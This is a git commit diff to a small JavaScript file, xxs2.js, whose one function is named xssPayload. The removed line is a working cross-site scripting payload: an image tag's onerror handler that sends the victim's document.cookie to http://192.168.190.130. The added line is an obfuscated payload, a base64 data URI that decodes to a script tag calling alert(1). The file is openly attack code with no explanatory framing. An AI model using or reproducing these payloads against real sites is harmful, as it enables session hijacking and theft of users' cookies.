94344c5f1ffd10e78c7c0be553c8344eee2c3690
Crow <74257119+InfoSec-Crow@users.noreply.github.com>
2022-10-27 09:49:19 +0200

    Update xxs2.js

--- xxs2.js
+++ xxs2.js
@@ -1,5 +1,5 @@
 function xssPayload() {
-  document.write("<img src=x onerror=this.src='http://192.168.190.130/?'+document.cookie;>")
+  document.write('<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>')
 
 }
 
